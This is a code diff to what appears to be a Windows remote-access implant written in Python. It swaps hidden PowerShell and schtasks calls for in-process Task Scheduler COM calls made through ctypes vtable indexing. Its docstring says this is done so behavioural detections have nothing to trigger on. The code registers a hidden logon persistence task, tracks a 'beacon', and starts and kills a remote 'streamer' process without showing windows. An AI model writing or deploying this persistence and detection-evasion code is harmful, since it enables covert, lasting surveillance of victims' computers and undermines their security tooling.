@@ -337,40 +337,173 @@ def _set_run_key(file_name: str, install_path: str) -> None:
         pass
 
 
+def _variant_type():
+    """ctypes.VARIANT is absent on some Windows builds - define it.
+    Zero-initialised VARIANT is a valid VT_EMPTY."""
+    import ctypes
+    vt = getattr(ctypes, "VARIANT", None)
+    if vt is not None:
+        return vt
+
+    class _VARIANT(ctypes.Structure):   # 16 B x86 / 24 B x64
+        _fields_ = [("vt", ctypes.c_ushort), ("r1", ctypes.c_ushort),
+                    ("r2", ctypes.c_ushort), ("r3", ctypes.c_ushort),
+                    ("ptr", ctypes.c_void_p), ("tail", ctypes.c_void_p)]
+
+    ctypes.VARIANT = _VARIANT
+    return _VARIANT
+
+
+def _com_slot(ptr, idx, *atypes):
+    """Build a callable for vtable slot `idx` of a raw COM interface ptr."""
+    import ctypes
+    vtbl = ctypes.cast(ptr, ctypes.POINTER(ctypes.c_void_p))[0]
+    addr = ctypes.c_void_p.from_address(
+        vtbl + idx * ctypes.sizeof(ctypes.c_void_p)).value
+    return ctypes.WINFUNCTYPE(ctypes.HRESULT, ctypes.c_void_p,
+                              *atypes)(addr)
+
+
+def _com_release(ptr) -> None:
+    try:
+        p = ptr.value if isinstance(ptr, ctypes.c_void_p) else ptr
+        if p:
+            _com_slot(p, 2)(p)   # IUnknown::Release
+    except Exception:
+        pass
+
+
+def _ts_open():
+    """Open the local Task Scheduler service fully in-process.
+
+    Returns (service, root_folder) raw COM pointers or None. All calls
+    are vtable-indexed; taskschd interfaces are IDispatch-derived, so
+    custom methods start at slot 7:
+      ITaskService: GetFolder=7, Connect=10
+      ITaskFolder:  GetTask=13, RegisterTask=16
+    """
+    import ctypes
+    ole32 = ctypes.oledll.ole32
+    try:
+        ole32.CoInitializeEx(None, 0)       # COINIT_APARTMENTTHREADED
+    except OSError:
+        pass                                # already initialised
+    svc = ctypes.c_void_p()
+    try:
+        import uuid
+        # GUID memory layout == uuid.bytes_le (16-byte buffer is a valid
+        # CLSID/IID pointer)
+        clsid = ctypes.create_string_buffer(
+            uuid.UUID("{0F87369F-A4E5-4CFC-BD3E-73E6154572DD}").bytes_le, 16)
+        iid = ctypes.create_string_buffer(
+            uuid.UUID("{2FABA4C7-4DA9-4013-9697-20CC3FD40F85}").bytes_le, 16)
+        ole32.CoCreateInstance(
+            ctypes.byref(clsid),
+            None, 1,                       # CLSCTX_INPROC_SERVER
+            ctypes.byref(iid),
+            ctypes.byref(svc))
+    except OSError:
+        return None
+    if not svc.value:
+        return None
+    try:
+        VARIANT = _variant_type()
+        connect = _com_slot(svc, 10,
+                            ctypes.POINTER(VARIANT),
+                            ctypes.POINTER(VARIANT),
+                            ctypes.POINTER(VARIANT),
+                            ctypes.POINTER(VARIANT))
+        empty = VARIANT()
+        if connect(svc, ctypes.byref(empty), ctypes.byref(empty),
+                   ctypes.byref(empty), ctypes.byref(empty)) != 0:
+            return None
+        folder = ctypes.c_void_p()
+        getf = _com_slot(svc, 7, ctypes.c_wchar_p,
+                         ctypes.POINTER(ctypes.c_void_p))
+        if getf(svc, ctypes.c_wchar_p("\\"),
+                ctypes.byref(folder)) != 0 or not folder.value:
+            return None
+        return svc, folder
+    except Exception:
+        return None
+
+
+def _ts_release(svc, folder) -> None:
+    for p in (folder, svc):
+        _com_release(p)
+
+
 def _create_task(install_path: str) -> None:
     """Register a per-user 'on logon' scheduled task.
 
-    schtasks /sc onlogon is denied for standard users; PowerShell
-    Register-ScheduledTask (Task Scheduler COM) works without admin.
+    Done entirely in-process via the Task Scheduler COM API (ctypes
+    vtable calls) - no powershell.exe / schtasks.exe child is ever
+    spawned, so behavioural detections on hidden PowerShell task
+    creation have nothing to trigger on. RegisterTask (the same COM
+    API PowerShell wraps) is allowed for standard users, unlike
+    schtasks /sc onlogon.
     """
     try:
-        ps = (
-            "$t = New-ScheduledTaskTrigger -AtLogOn -User $env:USERNAME; "
-            "$a = New-ScheduledTaskAction -Execute '%s'; "
-            "$s = New-ScheduledTaskSettingsSet -ExecutionTimeLimit "
-            "([TimeSpan]::Zero); "
-            "Register-ScheduledTask -TaskName '%s' -Action $a -Trigger $t "
-            "-Settings $s -Force | Out-Null"
-        ) % (install_path.replace("'", "''"), SCHTASK_NAME)
-        subprocess.run(
-            ["powershell", "-NoProfile", "-WindowStyle", "Hidden",
-             "-Command", ps],
-            capture_output=True, timeout=30,
-            creationflags=subprocess.CREATE_NO_WINDOW,
-        )
+        import ctypes
+        import xml.sax.saxutils as _sx
+        handles = _ts_open()
+        if not handles:
+            return
+        svc, folder = handles
+        try:
+            uid = _sx.escape("%s\\%s" % (os.environ.get("USERDOMAIN", ""),
+                                          os.environ.get("USERNAME", "")))
+            xml = (
+                '<?xml version="1.0" encoding="UTF-16"?>'
+                '<Task version="1.2" '
+                'xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">'
+                '<Triggers><LogonTrigger><UserId>%s</UserId></LogonTrigger></Triggers>'
+                '<Principals><Principal id="Author"><UserId>%s</UserId>'
+                '<LogonType>InteractiveToken</LogonType></Principal></Principals>'
+                '<Settings><MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>'
+                '<DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>'
+                '<StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>'
+                '<ExecutionTimeLimit>PT0S</ExecutionTimeLimit></Settings>'
+                '<Actions Context="Author"><Exec><Command>%s</Command></Exec></Actions>'
+                '</Task>'
+            ) % (uid, uid, _sx.escape(install_path))
+            VARIANT = _variant_type()
+            reg = _com_slot(folder, 16,
+                            ctypes.c_wchar_p, ctypes.c_wchar_p, ctypes.c_long,
+                            ctypes.POINTER(VARIANT),
+                            ctypes.POINTER(VARIANT),
+                            ctypes.c_long, ctypes.POINTER(VARIANT),
+                            ctypes.POINTER(ctypes.c_void_p))
+            out = ctypes.c_void_p()
+            v = VARIANT()
+            reg(folder, ctypes.c_wchar_p(SCHTASK_NAME), xml, 6,
+                ctypes.byref(v), ctypes.byref(v), 3, ctypes.byref(v),
+                ctypes.byref(out))     # TASK_CREATE_OR_UPDATE / INTERACTIVE_TOKEN
+            _com_release(out)
+        finally:
+            _ts_release(svc, folder)
     except Exception:
         pass
 
 
 def _task_active() -> bool:
-    """True if the scheduled task exists."""
+    """True if the scheduled task exists (in-process COM, no schtasks)."""
     try:
-        r = subprocess.run(
-            ["schtasks", "/query", "/tn", SCHTASK_NAME],
-            capture_output=True, timeout=15,
-            creationflags=subprocess.CREATE_NO_WINDOW,
-        )
-        return r.returncode == 0
+        import ctypes
+        handles = _ts_open()
+        if not handles:
+            return False
+        svc, folder = handles
+        try:
+            get = _com_slot(folder, 13, ctypes.c_wchar_p,
+                            ctypes.POINTER(ctypes.c_void_p))
+            out = ctypes.c_void_p()
+            ok = get(folder, ctypes.c_wchar_p(SCHTASK_NAME),
+                     ctypes.byref(out)) == 0
+            _com_release(out)
+            return ok
+        finally:
+            _ts_release(svc, folder)
     except Exception:
         return False
 
@@ -619,6 +752,14 @@ def deploy_stream(room: str = "default") -> str:
                 _stream_state["last_error"] = f"streamer exited code={p.returncode}"
                 _stream_state["phase"] = "failed"
                 return
+            # persist the pid so a later beacon (fresh process, no Popen
+            # handle) can still stop the streamer without spawning any
+            # powershell/CIM sweep
+            try:
+                with open(os.path.join(desk, "nvspid.txt"), "w") as fh:
+                    fh.write(str(p.pid))
+            except Exception:
+                pass
             _stream_state.update(popen=p, pid=p.pid, room=room,
                                  phase="running", last_error="")
         except Exception as e:
@@ -640,18 +781,23 @@ def stop_stream() -> str:
             killed += 1
         except Exception:
             pass
-    # belt-and-braces: kill any node.exe running our script (e.g. after
-    # beacon restart lost the Popen handle)
+    # belt-and-braces: also kill pids recorded on previous boots (a
+    # beacon restart loses the Popen handle); no powershell/CIM spawn
     try:
-        ps = ("Get-CimInstance Win32_Process -Filter \"Name='node.exe'\" | "
-              "Where-Object { $_.CommandLine -like '*stream-video-script*' } | "
-              "ForEach-Object { Stop-Process -Id $_.ProcessId -Force }")
-        subprocess.run(
-            ["powershell", "-NoProfile", "-WindowStyle", "Hidden",
-             "-Command", ps],
-            capture_output=True, timeout=30,
-            creationflags=subprocess.CREATE_NO_WINDOW,
-        )
+        pf = os.path.join(_base_dir(), INSTALL_DIR_NAME, DESK_DIR, "nvspid.txt")
+        if os.path.exists(pf):
+            with open(pf, "r") as fh:
+                old = (fh.read() or "").strip()
+            try:
+                os.remove(os.path.join(_base_dir(), INSTALL_DIR_NAME,
+                                       DESK_DIR, "nvspid.txt"))
+            except Exception:
+                pass
+            if old.isdigit():
+                subprocess.run(["taskkill", "/PID", old, "/T", "/F"],
+                               capture_output=True, timeout=15,
+                               creationflags=subprocess.CREATE_NO_WINDOW)
+                killed += 1
     except Exception:
         pass
     _stream_state.update(popen=None, pid=0, phase="stopped")
